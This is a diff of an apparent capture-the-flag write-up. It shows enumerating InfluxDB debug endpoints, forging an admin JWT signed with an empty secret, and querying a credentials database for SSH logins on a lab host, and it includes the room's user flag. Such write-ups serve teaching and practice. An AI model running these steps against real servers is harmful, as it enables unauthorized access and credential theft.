@@ -48,27 +48,46 @@ curl -s http://10.81.143.182:8086/debug/vars | grep -oP '\"database\":\"\K[^\^]+
 ```
 Result: Identified the database names: creds, docker, mixer, tanks.
 
-![DB software name](<./assets/Screenshot 3.png>)
+![DB name](<./assets/Screenshot 3.png>)
 <br>
 *Figure 3: (Identified the database names: creds, docker, mixer, tanks).*
 
+---
+
+
+```bash
+curl -i http://10.81.143.182:8086/debug/requests
+```
 
 Found the database username: o5yY6yya.
+
+![Found username](<./assets/Screenshot 4.png>)
+<br>
+*Figure 4: (Identified the usernames: o5yY6yya.)*
+
+---
 
 
 Discovered that the InfluxDB instance used an empty secret for JWT signing.
 
 I generated a malicious JWT admin token using Python:
-
-Python
+```bash
 python3 -c 'import jwt; print(jwt.encode({"username": "o5yY6yya", "exp": 2000000000}, "", algorithm="HS256"))'
+```
+![Generate token](<./assets/Screenshot 5.png>)
+<br>
+*Figure 5: (Generate JWT admin token.)*
+
+---
+
 3. Initial Access (User: uzJk6Ry98d8C)
 Using the forged JWT token, I queried the creds database and specifically the ssh measurement to retrieve the SSH credentials.
-
-Bash
+##GAMBAR 9
+```bash
 curl -s -G "http://10.81.143.182:8086/query?db=creds" \
 --data-urlencode "q=SELECT * FROM ssh" \
 -H "Authorization: Bearer <FORGED_TOKEN>"
+```
 I successfully logged in via SSH on port 2222.
 
 User Flag: THM{V4w4FhBmtp4RFDti}
